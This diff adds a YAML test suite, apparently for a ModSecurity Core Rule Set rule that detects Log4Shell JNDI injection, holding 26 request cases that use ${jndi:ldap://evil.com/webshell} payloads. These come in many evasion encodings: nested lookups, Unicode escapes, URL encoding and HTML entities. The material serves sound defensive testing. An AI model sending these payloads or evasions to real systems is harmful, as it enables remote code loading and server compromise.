@@ -1,0 +1,448 @@
+---
+# NOTE: Please keep these tests in sync with 944152.yaml and 944151.yaml.
+#       944152 should detect the same things as 944152 and 944151.
+meta:
+  author: "dune73, Max Leske"
+  enabled: true
+  name: "944152.yaml"
+  description: "Description"
+tests:
+  - test_title: 944152-1
+    desc: Log4J exploit on arg foo
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=${jndi:ldap://evil.com/webshell}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-2
+    desc: Log4J exploit on User-Agent
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests ${jndi:ldap://evil.com/webshell}
+            method: GET
+            port: 80
+            uri: /
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-3
+    desc: Log4J exploit in XML code
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/xml
+            method: POST
+            port: 80
+            uri: /
+            data: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><tag attribute="${jndi:ldap://evil.com/webshell}"/>
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-4
+    desc: Log4J exploit in XML code
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/xml
+            method: POST
+            port: 80
+            uri: /
+            data: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><tag>"${jndi:ldap://evil.com/webshell}"</tag>
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-5
+    desc: Log4J exploit on arg foo, with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=${${env:FOO:-j}ndi:ldap://evil.com/webshell}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-6
+    desc: Log4J exploit on arg foo, with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-7
+    desc: Log4J exploit on arg foo, with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=$${env:something:-${env:something:-$}{jndi:ldap://evil.com/webshell}}}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-8
+    desc: Log4J exploit on arg foo, with Unicode escape encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=$\u007Bjndi:ldap://evil.com/webshell}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-9
+    desc: Log4J exploit on JSON with URL encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-10
+    desc: Log4J exploit on JSON with Unicode escape evasion, uppercase
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u007Bjndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-11
+    desc: Log4J exploit on JSON with Unicode escape evasion, lowercase
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u007bjndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-12
+    desc: Log4J exploit on JSON with named HTML entity evasion, lower case
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$&lbrace;jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-13
+    desc: Log4J exploit on JSON with named HTML entity evasion, upper case
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$&LBRACE;jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-14
+    desc: Log4J exploit on JSON with numeric HTML entity evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "&#36;{jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-15
+    desc: Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-16
+    desc: Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "\u002524%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-17
+    desc: Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%24\u007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-18
+    desc: Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%24%26lbrace%3Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-19
+    desc: Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-20
+    desc: Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u0026lbrace;jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-21
+    desc: Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u0026#123;jndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-22
+    desc: Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "%24&lcub;\u006A&#110;di:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-23
+    desc: Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: '&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}'
+              Content-Type: text/html
+            method: GET
+            port: 80
+            uri: /
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-24
+    desc: Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/json
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u0026lbracejndi:ldap://evil.com/webshell}"}'
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-25
+    desc: Log4J exploit on arg foo, with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: foo=$${env:somethingveryverylong:-${env:something:-$}{jndi:ldap://evilhost.com/webshell}}}
+          output:
+            log_contains: id "944152"
+  - test_title: 944152-26
+    desc: Log4J exploit on arg foo, with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              Host: localhost
+              User-Agent: ModSecurity CRS 3 Tests
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /
+            data: '{"foo": "$\u0026lbracesomethingnotcoveredbyotherrules"}'
+          output:
+            log_contains: id "944152"
